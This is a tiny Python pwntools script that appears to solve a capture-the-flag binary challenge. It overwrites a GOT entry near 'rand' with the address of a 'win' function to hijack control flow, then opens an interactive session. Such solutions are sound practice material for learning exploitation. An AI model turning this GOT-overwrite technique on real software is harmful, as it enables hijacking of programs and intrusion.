from pwn import *

p = process('./chall')
e = ELF('./chall')

p.sendlineafter(b'hello', str(e.got['rand']+8).encode())
p.sendline(p64(e.symbols['win']))
p.interactive()
